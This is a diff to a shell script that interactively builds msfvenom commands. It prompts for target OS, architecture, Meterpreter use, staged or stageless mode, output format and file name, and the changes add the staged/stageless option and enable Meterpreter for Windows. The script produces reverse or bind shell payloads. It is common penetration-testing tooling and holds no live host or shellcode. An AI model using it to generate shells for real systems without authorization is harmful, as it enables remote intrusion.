@@ -16,6 +16,7 @@ case $OS in
 esac
 }
 
+
 meterpreter_question(){
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
 read meterpreter
@@ -27,13 +28,30 @@ case  $OS in
 		meterpreter_question
 	;;
 	windows)
-		meterpreter='n'
+		meterpreter_question
 	;;
 	osx)
 		meterpreter='n'
 	;;
 esac
 }
+
+
+echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless"
+read stage
+
+
+stage_symbol=""
+
+
+case $stage in
+	1)
+		stage_symbol="/"
+	;;
+	2)
+		stage_symbol="_"
+	;;
+esac
 
 
 case $architecture in
@@ -46,7 +64,6 @@ case $architecture in
 	64)
 		arc="/x64"
 		meterpreter_question
-
 	;;
 esac
 
@@ -83,12 +100,12 @@ echo "What would you like to name the file?"
 read filename
 
 use_meterpreter() {
-	msfgen="${payload}/${shell}_tcp ${ip_port} -f $format"
+	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
 }
 
 
 no_meterpreter() {
-        msfgen="${payload}${shell}_tcp ${ip_port} -f $format"
+        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
 }
 
 case  $meterpreter  in
@@ -98,7 +115,7 @@ case  $meterpreter  in
 	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	n)
-	payload="${OS}${arc}/shell_"
+	payload="${OS}${arc}/shell"
 	no_meterpreter
 	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
         ;;
